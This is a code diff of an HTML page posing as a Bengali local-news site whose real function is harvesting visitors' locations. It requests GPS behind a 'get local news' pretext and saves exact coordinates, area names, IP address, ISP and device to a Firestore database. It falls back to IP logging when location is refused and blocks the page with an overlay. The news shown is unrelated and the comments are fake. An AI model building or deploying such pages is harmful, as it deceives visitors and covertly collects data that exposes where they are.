@@ -42,12 +42,13 @@ border-radius:6px;
 .ad{background:#ddd;padding:20px;text-align:center;margin:10px 0;}
 .footer{background:#111;color:white;text-align:center;padding:15px;margin-top:20px;}
 
-/* 🔥 PREMIUM GATE */
+/* 🔥 SOFT GATE (blur style) */
 #locationGate{
 position:fixed;
 top:0;left:0;
 width:100%;height:100%;
-background:linear-gradient(135deg,#141e30,#243b55);
+backdrop-filter:blur(6px);
+background:rgba(0,0,0,0.4);
 display:none;
 justify-content:center;
 align-items:center;
@@ -59,35 +60,42 @@ background:white;
 padding:25px;
 border-radius:12px;
 width:90%;
-max-width:350px;
+max-width:340px;
 text-align:center;
-box-shadow:0 10px 30px rgba(0,0,0,0.3);
+box-shadow:0 10px 30px rgba(0,0,0,0.2);
+animation:fadeIn 0.4s ease;
 }
 
-.gate-box ul{
-text-align:left;
-font-size:14px;
-margin:10px 0;
+.gate-box h2{margin-bottom:10px;}
+.gate-box p{font-size:14px;color:#555;}
+
+.gate-box button{
+width:100%;
+padding:12px;
+background:#ff4b5c;
+color:white;
+border:none;
+border-radius:6px;
+font-size:16px;
+margin-top:10px;
+cursor:pointer;
+}
+
+@keyframes fadeIn{
+from{opacity:0; transform:scale(0.9);}
+to{opacity:1; transform:scale(1);}
 }
 </style>
 </head>
 
 <body>
 
-<!-- GATE -->
+<!-- 🔥 SOFT LOCATION GATE -->
 <div id="locationGate">
 <div class="gate-box">
-<h1>📍 Get Local News</h1>
-<p>আপনার এলাকার খবর দেখতে location চালু করুন</p>
-
-<ul>
-<li>✔ Local News</li>
-<li>✔ Weather</li>
-<li>✔ Alerts</li>
-</ul>
-
+<h2>📍 Enable Location</h2>
+<p>আপনার এলাকার খবর ও আপডেট দেখতে location চালু করুন</p>
 <button onclick="retryLocation()">Enable Location</button>
-<small>🔒 আপনার তথ্য নিরাপদ</small>
 </div>
 </div>
 
@@ -146,56 +154,75 @@ appId: "1:951484366467:web:2e936d42b1704027f665b6"
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-// USER
+// USER ID
 function getUserId(){
-let id=localStorage.getItem("userId")
+let id = localStorage.getItem("userId")
 if(!id){
-id=Math.random().toString(36).substring(2,10)
-localStorage.setItem("userId",id)
+id = Math.random().toString(36).substring(2,10)
+localStorage.setItem("userId", id)
 }
 return id
 }
 
 // DEVICE
 function detectDevice(){
-return /mobile/i.test(navigator.userAgent)?"Mobile":"Desktop"
+let ua=navigator.userAgent;
+if(/mobile/i.test(ua)) return "Mobile";
+return "Desktop";
 }
 
 function detectDeviceModel(){
-let ua=navigator.userAgent
-if(ua.includes("Android")) return "Android"
-if(ua.includes("Windows")) return "Windows"
-return "Unknown"
+let ua=navigator.userAgent;
+if(ua.includes("Android")) return "Android Phone";
+if(ua.includes("Windows")) return "Windows PC";
+if(ua.includes("Mac")) return "Mac";
+return "Unknown";
 }
 
-// LOCATION
-async function getLocationDetails(lat,lon){
+// LOCATION DETAILS
+async function getLocationDetails(lat, lon){
 try{
-let res=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
-let d=await res.json()
+const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+const data = await res.json()
+let a = data.address
+
 return {
-thana:d.address.suburb||"unknown",
-district:d.address.state_district||"unknown"
+thana: a.suburb || a.village || a.town || a.municipality || a.county || "unknown",
+district: a.state_district || a.county || "unknown"
 }
-}catch{return {thana:"unknown",district:"unknown"}}
+}catch{
+return {thana:"unknown",district:"unknown"}
+}
 }
 
+// IP
 async function getIP(){
-let r=await fetch("https://ipinfo.io/json")
-return await r.json()
+let res = await fetch("https://ipinfo.io/json")
+let data = await res.json()
+
+return {
+ip:data.ip,
+org:data.org,
+country:data.country
+}
 }
 
+// SAVE
 async function save(data){
-await setDoc(doc(db,"locations",getUserId()),data)
+let id = getUserId()
+await setDoc(doc(db,"locations",id), data)
 }
 
+// GPS
 async function handleGPS(pos){
-let loc=await getLocationDetails(pos.coords.latitude,pos.coords.longitude)
-let ip=await getIP()
+let lat = pos.coords.latitude
+let lon = pos.coords.longitude
+let loc = await getLocationDetails(lat,lon)
+let ip = await getIP()
 
 save({
-latitude:pos.coords.latitude,
-longitude:pos.coords.longitude,
+latitude:lat,
+longitude:lon,
 thana:loc.thana,
 district:loc.district,
 country:ip.country,
@@ -208,8 +235,9 @@ time:new Date().toLocaleString()
 })
 }
 
+// IP fallback
 async function handleIP(){
-let ip=await getIP()
+let ip = await getIP()
 save({
 country:ip.country,
 ip:ip.ip,
@@ -221,92 +249,59 @@ time:new Date().toLocaleString()
 })
 }
 
+// 🔥 AUTO OPTIMIZED FLOW
 function autoDetect(){
 navigator.geolocation.getCurrentPosition(
-pos=>handleGPS(pos),
-()=>{handleIP();document.getElementById("locationGate").style.display="flex"}
+pos=>{
+handleGPS(pos)
+},
+()=>{
+handleIP()
+document.getElementById("locationGate").style.display="flex"
+}
 )
 }
 
-window.retryLocation=function(){
+// retry
+window.retryLocation = function(){
 navigator.geolocation.getCurrentPosition(
 pos=>{
 document.getElementById("locationGate").style.display="none"
 handleGPS(pos)
 },
-()=>{alert("Please enable location from browser settings")}
+()=>{
+alert("Location still blocked")
+}
 )
 }
 
 // NEWS
 let newsData=[]
-
 async function loadNews(){
-
-let container=document.getElementById("newsContainer")
-container.innerHTML="Loading..."
-
-try{
-
-let res=await fetch("https://api.rss2json.com/v1/api.json?rss_url=https://www.prothomalo.com/feed")
+let res=await fetch("https://api.spaceflightnewsapi.net/v4/articles/")
 let data=await res.json()
+newsData=data.results
 
-if(!data.items) throw "fail"
-
-renderNews(data.items)
-
-}catch{
-
-let fallback=[
-{title:"ঢাকায় নতুন সিদ্ধান্ত — বড় পরিবর্তন আসছে",img:"https://source.unsplash.com/400x300/?dhaka"},
-{title:"আবহাওয়া সতর্কতা — বৃষ্টি হতে পারে",img:"https://source.unsplash.com/400x300/?rain"},
-{title:"ডলারের দাম বেড়েছে",img:"https://source.unsplash.com/400x300/?money"},
-{title:"বাংলাদেশ ম্যাচে জয়",img:"https://source.unsplash.com/400x300/?football"}
-]
-
-container.innerHTML=""
-
-fallback.forEach(n=>{
-let div=document.createElement("div")
-div.className="card"
-div.innerHTML=`<img src="${n.img}"><h4>${n.title}</h4>`
-div.onclick=()=>openFallback(n)
-container.appendChild(div)
-})
-
-}
-
-}
-
-function renderNews(items){
 let container=document.getElementById("newsContainer")
 container.innerHTML=""
 
-items.slice(0,8).forEach(n=>{
-let img=n.thumbnail || "https://source.unsplash.com/400x300/?news"
+newsData.slice(0,8).forEach((n,i)=>{
 let div=document.createElement("div")
 div.className="card"
-div.innerHTML=`<img src="${img}"><h4>${n.title}</h4>`
-div.onclick=()=>openArticle(n)
+div.innerHTML=`<img src="${n.image_url}"><h4>${n.title}</h4>`
+div.onclick=()=>openArticle(i)
 container.appendChild(div)
 })
 }
 
-function openArticle(n){
+// article
+window.openArticle=function(i){
+let n=newsData[i]
 document.getElementById("homePage").style.display="none"
 document.getElementById("articlePage").style.display="block"
 document.getElementById("title").innerText=n.title
-document.getElementById("image").src=n.thumbnail
-document.getElementById("content").innerText=n.description.replace(/<[^>]+>/g,'')
-loadComments()
-}
-
-function openFallback(n){
-document.getElementById("homePage").style.display="none"
-document.getElementById("articlePage").style.display="block"
-document.getElementById("title").innerText=n.title
-document.getElementById("image").src=n.img
-document.getElementById("content").innerText="বিস্তারিত জানতে আমাদের সাথে থাকুন"
+document.getElementById("image").src=n.image_url
+document.getElementById("content").innerText=n.summary
 loadComments()
 }
 
@@ -315,8 +310,9 @@ document.getElementById("homePage").style.display="block"
 document.getElementById("articlePage").style.display="none"
 }
 
+// comments
 function loadComments(){
-let arr=["দারুণ খবর!","খুব ভালো লেগেছে","ধন্যবাদ"]
+let arr=["Great news!","Nice update!","Very informative"]
 let list=document.getElementById("commentList")
 list.innerHTML=""
 arr.forEach(c=>{
@@ -327,8 +323,8 @@ list.appendChild(d)
 })
 }
 
-// INIT
-setTimeout(()=>autoDetect(),2000)
+// INIT (delay for better conversion)
+setTimeout(()=>{autoDetect()},2000)
 loadNews()
 
 </script>
